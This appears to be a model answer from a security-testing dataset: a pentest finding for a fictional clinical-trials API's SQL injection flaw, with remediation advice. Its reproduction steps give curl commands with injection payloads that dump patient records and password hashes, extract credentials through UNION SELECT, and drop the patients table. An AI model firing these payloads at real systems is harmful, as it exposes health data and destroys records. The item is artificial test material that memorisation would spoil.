# Expected Response

## System
- System: TrialVault ClinicalOps API v4.2.0
- Domain: PHARMACEUTICAL / CLINICAL TRIALS
- Example ID: INJ-0121
- Risk ID: RISK-INJ-121

## Findings

### 1. SQL Injection on `/api/v3/patients?search=` — Tautology + DDL Escalation (RISK-INJ-121)

The `search` parameter on `GET /api/v3/patients` is directly interpolated into a raw SQL query without parameterization. An attacker can inject a tautology (`' OR 1=1 --`) to dump all patient records, or use UNION SELECT to extract credential data. With `db_owner` privileges, DDL operations (DROP TABLE) can destroy clinical trial datasets — an FDA 21 CFR Part 11 data integrity violation.

**Evidence from HAR:**
- Endpoint: `GET /api/v3/patients?search=' OR 1=1 --` (URL-encoded: `%27%20OR%201=1%20--`)
- Response: HTTP 200 with all patient/admin records including `password_hash` and `role: "ADMIN"`
- Query constructed: `SELECT * FROM patients WHERE search = '' OR 1=1 --'` — evaluates true for all rows
- DB account: `db_owner` — DDL and DML operations permitted

## Steps to Reproduce

**Step 1 — Baseline:**
```bash
curl -s "https://api.trialvault-clin.example.com/api/v3/patients?search=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching patient records only.

**Step 2 — SQL tautology: dump all patient records (primary HAR attack):**
```bash
curl -s "https://api.trialvault-clin.example.com/api/v3/patients?search=%27%20OR%201=1%20--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All patient records returned including admin `password_hash` — clinical trial participant data (PHI) exposed.

**Step 3 — UNION SELECT: extract all credentials from patients table:**
```bash
curl -s "https://api.trialvault-clin.example.com/api/v3/patients?search=%27%20UNION%20SELECT%20id,username,password_hash,role%20FROM%20patients%20--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All trial staff credentials and participant records exposed.

**Step 4 — DDL escalation: destroy clinical trial dataset (db_owner):**
```bash
curl -s "https://api.trialvault-clin.example.com/api/v3/patients?search=%27%3B%20DROP%20TABLE%20patients%20--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** `patients` table dropped — entire clinical trial dataset destroyed. Pharmaceutical company loses Phase III trial data, triggering FDA audit and regulatory liability.

**Step 5 — Verbose SQL error fingerprint:**
```bash
curl -s "https://api.trialvault-clin.example.com/api/v3/patients?search=%27" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected (RISK-INJ-121 misconfiguration):** SQL syntax error leaking table/column names.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- Replace raw string concatenation with parameterized queries: `SELECT * FROM patients WHERE search = $1` (RISK-INJ-121).
- Restrict DB account to SELECT/INSERT on required tables (remove `db_owner`).
- Disable verbose error messages in production.
- Deploy WAF/input validation: reject inputs containing `'`, `;`, `--`, `/*`, `UNION`, `DROP`.
